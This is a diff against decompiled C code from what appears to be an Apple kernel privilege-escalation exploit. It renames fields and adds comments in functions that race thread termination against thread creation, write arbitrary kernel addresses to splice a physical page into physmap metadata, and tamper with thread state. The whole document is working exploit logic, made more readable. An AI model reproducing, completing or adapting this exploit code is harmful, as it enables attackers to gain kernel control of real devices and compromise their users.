@@ -11130,61 +11130,108 @@ LABEL_68:
 // 48030: using guessed type __int64 qword_48030;
 // 48040: using guessed type __int64 qword_48040;
 
+struct vmcopy_race_thread_block_ref
+{
+  uint64_t isa;
+  uint64_t flags;
+  void *invoke;
+  void *descriptor;
+  __int64 *state;
+  thread_act_t *targetThread;
+  thread_act_t *threadList;
+  semaphore_t readySemaphore;
+  semaphore_t resumeSemaphore;
+};
+
+struct vmcopy_write_physmap_block_ref
+{
+  uint64_t isa;
+  uint64_t flags;
+  __int64 (__fastcall *invoke)(__int64, unsigned __int8);
+  void *descriptor;
+  __int64 ctx;
+  __int64 kaddr;
+  unsigned __int64 pteIndex;
+  unsigned __int64 pteAddr;
+  unsigned __int64 pageTableBase;
+  vm_size_t size;
+  __int64 savedNext;
+  __int64 savedPrev;
+  int pageShift;
+  mem_entry_name_port_t objectHandle;
+};
+
+struct vmcopy_trigger_thread_block_ref
+{
+  uint64_t isa;
+  uint64_t flags;
+  void *invoke;
+  void *descriptor;
+  __int64 ctx;
+  __int64 *state;
+  semaphore_t readySemaphore;
+  semaphore_t resumeSemaphore;
+};
+
 //----- (00000000000125E4) ----------------------------------------------------
 __int64 __fastcall run_exploit_thread(__int64 a1)
 {
-  __int64 i; // x20
-  __int64 result; // x0
-  uint64_t *v4; // x9
+  struct vmcopy_race_thread_block_ref *block = (struct vmcopy_race_thread_block_ref *)a1;
+  __int64 result = 0;
 
+  // Paired with the main race loop: wait until the parent has primed the
+  // mapped thread object, terminate it, then refill the slot with new threads.
   __semwait_signal();
-  while ( !**(uint64_t **)(a1 + 32) )
+  while ( !*block->state )
     ;
-  thread_terminate(**(uint32_t **)(a1 + 40));
-  for ( i = 0; i != 256; i += 4 )
-    result = thread_create(mach_task_self_, (thread_act_t *)(*(uint64_t *)(a1 + 48) + i));
-  v4 = *(uint64_t **)(a1 + 32);
-  **(uint32_t **)(a1 + 40) = 0;
-  *v4 = 2;
+  thread_terminate(*block->targetThread);
+  for ( __int64 i = 0; i != 256; i += 4 )
+    result = thread_create(mach_task_self_, (thread_act_t *)((char *)block->threadList + i));
+  *block->targetThread = 0;
+  *block->state = 2;
   return result;
 }
 
 //----- (0000000000012678) ----------------------------------------------------
 __int64 __fastcall write_kaddr_to_physmap(__int64 a1, unsigned __int8 a2)
 {
-  __int64 v4; // x21
-  __int64 v5; // x8
+  struct vmcopy_write_physmap_block_ref *block = (struct vmcopy_write_physmap_block_ref *)a1;
+  __int64 ctx; // x21
+  __int64 pageIndex; // x8
   mem_entry_name_port_t object_handle; // [xsp+Ch] [xbp-24h] BYREF
 
   object_handle = 0;
-  v4 = *(uint64_t *)(a1 + 32);
-  kwrite_u64_to_addr(*(uint64_t *)(v4 + 8), *(uint64_t *)(a1 + 40), *(uint64_t *)(a1 + 48) | (*(uint64_t *)(a1 + 48) << 32));
-  v5 = (*(uint64_t *)(a1 + 40) - *(uint64_t *)(a1 + 64)) >> *(uint32_t *)(a1 + 96);
-  kwrite_u64_to_addr(*(uint64_t *)(v4 + 8), *(uint64_t *)(a1 + 56) + 8LL, v5 | (v5 << 32));
+  ctx = block->ctx;
+
+  // Temporarily splice the chosen physical page into the physmap metadata.
+  kwrite_u64_to_addr(*(uint64_t *)(ctx + 8), block->kaddr, block->pteIndex | (block->pteIndex << 32));
+  pageIndex = (block->kaddr - block->pageTableBase) >> block->pageShift;
+  kwrite_u64_to_addr(*(uint64_t *)(ctx + 8), block->pteAddr + 8LL, pageIndex | (pageIndex << 32));
   mach_make_memory_entry(
     mach_task_self_,
-    (vm_size_t *)(a1 + 72),
+    &block->size,
     0,
     (a2 << 24) | 0x10003,
     &object_handle,
-    *(uint32_t *)(a1 + 100));
-  kwrite_u64_to_addr(*(uint64_t *)(v4 + 8), *(uint64_t *)(a1 + 56) + 8LL, *(uint64_t *)(a1 + 80));
-  kwrite_u64_to_addr(*(uint64_t *)(v4 + 8), *(uint64_t *)(a1 + 40), *(uint64_t *)(a1 + 88));
+    block->objectHandle);
+  kwrite_u64_to_addr(*(uint64_t *)(ctx + 8), block->pteAddr + 8LL, block->savedNext);
+  kwrite_u64_to_addr(*(uint64_t *)(ctx + 8), block->kaddr, block->savedPrev);
   return mach_port_destroy(mach_task_self_, object_handle);
 }
 
 //----- (0000000000012754) ----------------------------------------------------
 __int64 __fastcall trigger_thread_state_mod(__int64 a1)
 {
-  __int64 v2; // x20
-  thread_act_t v3; // w0
+  struct vmcopy_trigger_thread_block_ref *block = (struct vmcopy_trigger_thread_block_ref *)a1;
+  __int64 ctx; // x20
+  thread_act_t targetThread; // w0
 
-  v2 = *(uint64_t *)(a1 + 32);
+  ctx = block->ctx;
   __semwait_signal();
-  while ( !**(uint64_t **)(a1 + 40) )
+  while ( !*block->state )
     ;
-  v3 = *(uint32_t *)(v2 + 672);
-  return thread_set_state(v3, 6, (thread_state_t)(v2 + 384), 0x44u);
+  targetThread = *(uint32_t *)(ctx + 672);
+  return thread_set_state(targetThread, 6, (thread_state_t)(ctx + 384), 0x44u);
 }
 // 127B0: variable 'vars8' is possibly undefined
 
